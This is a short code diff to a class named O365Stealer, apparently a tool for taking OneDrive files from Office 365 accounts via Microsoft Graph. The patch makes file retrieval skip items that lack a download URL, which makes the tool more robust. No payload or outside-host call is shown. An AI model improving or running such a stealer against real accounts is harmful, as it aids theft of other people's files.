@@ -1166,7 +1166,7 @@ class O365Stealer(DatabaseOperations, DatabaseConnection):
             while value >= 0:
                 try:
                     # Get the download URL and file details
-                    url = response['value'][value]['@microsoft.graph.downloadUrl']
+                    url = response['value'][value].get('@microsoft.graph.downloadUrl')
                     name = response['value'][value]['name']
                     itemId = response['value'][value]['id']
                     filename, extension = os.path.splitext(name)
@@ -1175,7 +1175,7 @@ class O365Stealer(DatabaseOperations, DatabaseConnection):
                     # Create the folder to save the files to
                     
                     # Download the file if it matches the specified extensions or '*'
-                    if extension in extensions or extensions == '*':
+                    if url and (extension in extensions or extensions == '*'):
                         if self.args.refresh_all is False:
                             print(crayons.blue('[*] Retrieving OneDrive Files', bold=True))
 
